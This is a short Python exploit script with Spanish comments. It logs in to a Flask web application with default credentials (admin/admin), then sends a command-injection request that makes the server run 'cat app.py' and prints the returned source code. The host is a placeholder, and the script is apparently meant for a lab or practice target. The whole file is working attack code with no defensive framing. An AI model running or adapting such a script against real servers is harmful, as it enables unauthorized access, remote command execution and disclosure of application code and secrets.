#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

import requests

# URL del servidor Flask
BASE_URL = "http://ip:5000"

# Endpoint para la inyección de comandos
EXECUTE_ENDPOINT = f"{BASE_URL}/api/execute"

# Comando para leer el archivo app.py
COMMAND = "cat app.py"

# Datos de autenticación (si es necesario)
AUTH_DATA = {
    "username": "admin",
    "password": "admin"
}

# Iniciar sesión para obtener la cookie de autenticación
def login():
    login_url = f"{BASE_URL}/login"
    session = requests.Session()
    response = session.post(login_url, data=AUTH_DATA)
    if response.status_code == 200:
        print("[+] Inicio de sesión exitoso.")
        return session
    else:
        print("[-] Error en el inicio de sesión.")
        return None

# Explotar la inyección de comandos
def exploit_command_injection(session):
    # Datos para la solicitud POST
    payload = {
        "command": COMMAND
    }
    
    # Enviar la solicitud POST
    response = session.post(EXECUTE_ENDPOINT, json=payload)
    
    # Verificar la respuesta
    if response.status_code == 200:
        print("[+] Comando ejecutado con éxito.")
        print("[+] Respuesta del servidor:")
        print(response.json().get("result", "No se encontró resultado."))
    else:
        print(f"[-] Error al ejecutar el comando. Código de estado: {response.status_code}")
        print(response.json().get("error", "No se encontró mensaje de error."))

# Función principal
def main():
    # Iniciar sesión
    session = login()
    if not session:
        return
    
    # Explotar la inyección de comandos
    exploit_command_injection(session)

if __name__ == "__main__":
    main()